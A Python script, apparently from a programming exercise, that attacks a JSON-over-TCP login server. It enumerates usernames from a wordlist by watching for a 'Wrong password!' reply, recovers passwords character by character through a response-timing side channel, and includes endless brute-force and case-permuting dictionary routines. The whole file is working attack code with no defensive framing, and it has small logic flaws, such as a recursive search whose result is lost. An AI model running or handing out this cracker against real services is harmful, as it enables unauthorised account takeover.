import argparse
import datetime
import json
import string
from itertools import product
from socket import socket


class TCPClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None

    def connect(self):
        if self.socket is None:
            self.socket = socket()
        self.socket.connect((self.host, self.port))

    def disconnect(self):
        self.socket.close()
        self.socket = None

    def send_data(self, data):
        if self.socket is None:
            self.connect()
        self.socket.send(data.encode())

    def read_data(self):
        if self.socket is None:
            self.connect()
        return self.socket.recv(1024).decode()


class Crack:
    def __init__(self, conn):
        self.conn = conn

    def find_login(self, dictionary):
        with open(dictionary, 'r') as dictionary:
            for login in dictionary:
                login = login.strip('\n')
                data = json.dumps({'login': login, 'password': ' '})
                self.conn.send_data(data)
                resp = json.loads(self.conn.read_data())
                if resp.get('result') == 'Wrong password!':
                    return login
            return False

    def find_password(self, login, start_with=''):
        resp_time = []
        for password in Crack.generate_password():
            data = json.dumps({'login': login, 'password': start_with + password})
            self.conn.send_data(data)
            before = datetime.datetime.now()
            resp = json.loads(self.conn.read_data())
            time_diff = datetime.datetime.now() - before
            if time_diff > datetime.timedelta(milliseconds=2):
                self.find_password(login, start_with + password)
                break
            if resp.get('result') == 'Connection success!':
                print(data)
                return data

    def brute_password(self):
        for password in Crack.generate_password():
            if self.check_password(password):
                print(password)
                break

    def dict_mod(self, dictionary):
        with open(dictionary, 'r') as dictionary:
            for password in Crack.case_swith(dictionary):
                if self.check_password(password):
                    print(password)
                    break

    def check_password(self, password):
        self.conn.send_data(password)
        resp = self.conn.read_data()
        if resp == 'Connection success!':
            return password
        if resp == 'Too many attempts':
            return resp
        return False


    @staticmethod
    def case_swith(dictionary):
        for password in dictionary:
            password = password.strip("\n")
            if password.isdecimal():
                yield password
            else:
                for val in product(*([letter.lower(), letter.upper()] for letter in password)):
                    yield ''.join(val)

    @staticmethod
    def generate_password():
        index = 1
        while True:
            charset = string.ascii_letters + string.digits
            for password in product(charset, repeat=index):
                yield ''.join(map(str, password))
            index += 1


def main():
    parse_args = argparse.ArgumentParser()
    parse_args.add_argument('host', help='enter hostname')
    parse_args.add_argument('port', help='enter port number', type=int)
    args = parse_args.parse_args()

    conn = TCPClient(args.host, args.port)
    conn.connect()
    login = Crack(conn).find_login('logins.txt')
    Crack(conn).find_password(login)
    conn.disconnect()


if __name__ == '__main__':
    main()
